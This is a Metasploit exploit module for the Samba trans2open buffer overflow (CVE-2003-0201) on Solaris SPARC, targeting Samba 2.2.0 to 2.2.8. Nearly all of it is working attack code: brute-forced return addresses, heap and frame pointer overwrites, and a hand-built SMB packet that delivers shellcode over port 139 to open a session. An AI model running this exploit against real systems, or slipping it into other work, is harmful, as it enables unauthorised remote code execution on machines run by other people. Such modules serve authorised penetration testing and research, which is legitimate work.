##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::SMB::Client
  include Msf::Exploit::Brute

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Samba trans2open Overflow (Solaris SPARC)',
        'Description' => %q{
          This exploits the buffer overflow found in Samba versions
          2.2.0 to 2.2.8. This particular module is capable of
          exploiting the flaw on Solaris SPARC systems that do not
          have the noexec stack option set. Big thanks to MC and
          valsmith for resolving a problem with the beta version of
          this module.
        },
        'Author' => [ 'hdm', 'jduck' ],
        'License' => MSF_LICENSE,
        'References' => [
          [ 'CVE', '2003-0201' ],
          [ 'OSVDB', '4469' ],
          [ 'BID', '7294' ],
          [ 'URL', 'https://seclists.org/bugtraq/2003/Apr/103' ]
        ],
        'Privileged' => true,
        'Payload' => {
          'Space' => 1024,
          'BadChars' => "\x00",
          'MinNops' => 512
        },
        'Platform' => 'solaris',
        'Targets' => [
          [
            'Samba 2.2.x - Solaris 9 (sun4u) - Bruteforce',
            {
              'PtrToNonZero' => 0xffbffffc, # near the bottom of the stack
              'Offset' => 1103,
              'Bruteforce' =>
                {
                  'Start' => { 'Ret' => 0xffbffaf0 },
                  'Stop' => { 'Ret' => 0xffbfa000 },
                  'Step' => 128
                }
            }
          ],
          [
            'Samba 2.2.x - Solaris 7/8 (sun4u) - Bruteforce',
            {
              'PtrToNonZero' => 0xffbefffc, # near the bottom of the stack
              'Offset' => 1103,
              'Bruteforce' =>
                {
                  'Start' => { 'Ret' => 0xffbefaf0 },
                  'Stop' => { 'Ret' => 0xffbea000 },
                  'Step' => 128
                }
            }
          ]
        ],
        'DefaultTarget' => 0,
        'DisclosureDate' => '2003-04-07',
        'Notes' => {
          'Stability' => [ CRASH_SERVICE_RESTARTS, ],
          'Reliability' => [ REPEATABLE_SESSION, ],
          'SideEffects' => [ IOC_IN_LOGS, ]
        }
      )
    )

    register_options([
      Opt::RPORT(139)
    ])

    deregister_options('SMB::ProtocolVersion')
  end

  def brute_exploit(addrs)
    curr_ret = addrs['Ret']
    print_status('Trying return address 0x%.8x...' % curr_ret)

    connect(versions: [1])
    smb_login

    #
    # The obstacle course:
    # 	outsize = smb_messages[type].fn(conn, inbuf,outbuf,size,bufsize);
    # 	smb_dump(smb_fn_name(type), 0, outbuf, outsize);
    # 	return(outsize);
    #

    # This value *must* be 1988 to allow findrecv shellcode to work
    pattern = rand_text_english(1988)

    #
    # This was tested against sunfreeware samba 2.2.7a / solaris 9 / sun4u
    #
    # Patch the overwritten heap pointers
    # substr($pattern, 1159, 4, pack('N', $target->[4]));
    # substr($pattern, 1163, 4, pack('N', $target->[4]));
    #
    # >:-) smb_messages[ (((type << 1) + type) << 2) ] == 0
    # substr($pattern, 1195, 4, pack('N', 0xffffffff));
    #
    # Fix the frame pointer (need to check for null in address)
    # substr($pattern, 1243, 4, pack('N', $target->[3]-64));
    #
    # Finally set the return address
    # substr($pattern, 1247, 4, pack('N', $curr_ret));
    #

    #
    # This method is more reliable against a wider range of targets
    #

    off = target['Offset']
    ptr_to_non_zero = target['PtrToNonZero']

    # Local variable pointer patches for early versions of 2.2.x
    pattern[off, 36] = [ptr_to_non_zero - 1024].pack('N') * 9
    off += 36

    # Overwrite heap pointers with a ptr to NULL at the top of the stack
    pattern[off, 40] = [ptr_to_non_zero - 1024].pack('N') * 10
    off += 40

    # Patch the type index into the smb_messages[] array...
    # >:-) smb_messages[ (((type << 1) + type) << 2) ] == 0
    pattern[off, 20] = [0xffffffff].pack('N') * 5
    off += 20

    # This stream covers the framepointer and the return address
    pattern[off, 400] = [curr_ret].pack('N') * 100

    # Stuff the shellcode into the request
    pattern[3, payload.encoded.length] = payload.encoded

    trans =
      "\x00\x04\x08\x20\xff\x53\x4d\x42\x32\x00\x00\x00\x00\x00\x00\x00" \
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00" \
      "\x64\x00\x00\x00\x00\xd0\x07\x0c\x00\xd0\x07\x0c\x00\x00\x00\x00" \
      "\x00\x00\x00\x00\x00\x00\x00\xd0\x07\x43\x00\x0c\x00\x14\x08\x01" \
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x90" +
      pattern

    sock.put(trans)
    handler
    disconnect
  rescue EOFError
    print_error(e.to_s)
  rescue StandardError => e
    print_error(e.to_s)
  end
end
